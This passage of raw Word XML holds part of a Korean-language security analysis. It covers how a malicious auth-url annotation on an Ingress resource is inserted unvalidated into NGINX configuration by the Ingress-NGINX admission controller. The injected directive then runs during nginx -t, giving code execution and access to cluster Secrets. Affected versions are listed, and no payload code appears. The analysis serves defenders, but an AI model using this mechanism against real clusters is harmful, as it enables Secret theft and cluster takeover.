          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>해당</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> directive</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행되어</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>컨트롤러</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>컨텍스트</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>내에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임의</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유출로</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이어질</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F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F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F721A8F" w14:textId="39AA0D84" w:rsidR="00BC09C2" w:rsidRPr="00BC09C2" w:rsidRDefault="00BC09C2" w:rsidP="00F9143F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC09C2">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">4.3 </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약한</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경로</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>동작</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>흐름</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>상세</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설명</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F5D1E5" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress 리소스 생성/수정</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>공격자는 Ingress 리소스의 auth-url annotation에 악의적인 값을 삽입해 API 서버에 등록합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E821FF9" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 처리</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Ingress-NGINX Controller의 Admission Controller가 해당 Ingress 객체를 감지하고, 임시 NGINX 설정 파일을 생성합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51116EDE" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>설정 파일 생성</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>이 과정에서 auth-url annotation 값이 별도의 검증 없이 NGINX 설정 템플릿에 삽입됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D72B91" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>NGINX 설정 검증(nginx -t)</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Admission Controller는 NGINX 설정의 유효성을 검사하기 위해 nginx -t 명령을 실행합니다. 이때 주입된 악성 directive가 실행됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DAF293F" w14:textId="1DB6A90B" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="73"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>임의 코드 실행 및 권한 상승</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>컨트롤러 프로세스 권한으로 악성 코드가 실행되며, 기본 설정에서는 클러스터 전체 Secrets에 접근할 수 있습니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>공격자는 추가적으로 lateral movement를 통해 클러스터 전체를 장악할 수 있습니</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2568FF48" w14:textId="437A1B74" w:rsidR="00BC09C2" w:rsidRPr="00BC09C2" w:rsidRDefault="00BC09C2" w:rsidP="002734E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC09C2">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">4.4 </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>발생</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위치</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>범위</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C05411" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>발생 위치:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0865FABA" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller의 템플릿 처리 로직(auth-url annotation → $externalAuth.URL → nginx.conf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B507049" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller의 임시 설정 파일 생성 및 검증 단계</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F07BA1" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>영향 범위:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC3CAE6" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress-NGINX Controller v1.11.4 이하, v1.12.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654B933F" w14:textId="77777777" w:rsidR="00F9143F" w:rsidRPr="00F9143F" w:rsidRDefault="00F9143F" w:rsidP="00F9143F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F9143F">
        <w:rPr>
